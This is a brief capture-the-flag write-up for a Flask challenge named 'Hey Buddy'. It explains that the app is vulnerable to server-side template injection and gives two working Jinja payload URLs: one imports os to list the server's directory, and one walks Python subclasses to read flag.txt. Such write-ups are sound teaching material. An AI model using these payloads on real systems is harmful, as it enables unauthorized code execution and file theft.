
## Hey Buddy!

![img](https://i.ibb.co/pdSMfVs/image.png)


## Solution:

This challenge is developed using flask and it contains the SSTI (Server Side Template Injection) vulnerability. It has two steps to exploit.

Step 1: Checking where is the flag file location

```
https://h3y-buddy.vishwactf.com/submit?name={{request.application.__globals__.__builtins__.__import__(%27os%27).listdir()}}
```
![img](https://i.ibb.co/nksZN8w/image.png)

Step 2: Reading flag file using the vulnerability

```
https://h3y-buddy.vishwactf.com/submit?name={{%27abc%27.__class__.__base__.__subclasses__()[92].__subclasses__()[0].__subclasses__()[0](%27flag.txt%27).read()}}
```

![img](https://i.ibb.co/tLrfQyX/image.png)
